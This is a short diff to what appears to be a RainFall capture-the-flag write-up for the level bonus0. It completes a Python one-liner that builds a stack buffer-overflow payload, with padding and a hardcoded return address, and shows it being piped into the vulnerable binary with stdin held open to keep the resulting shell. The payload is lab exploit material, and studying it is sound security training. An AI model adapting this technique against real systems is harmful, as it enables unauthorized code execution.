@@ -596,4 +596,8 @@ I think it is just incredible!
 
 # Result
 
-	bonus0@RainFall:~$ python -c 'print "0" * 4095 + "\n" + "123456789" + "\x5f\xf8\xf
+	bonus0@RainFall:~$ python -c 'print "0" * 4095 + "\n" + "123456789" + "\x5f\xf8\xff\xbf" + "0" * 7' > /tmp/bonus0
+	bonus0@RainFall:~$ cat /tmp/bonus0 - | ./bonus0
+	 -
+	 -
+	0000000000000000
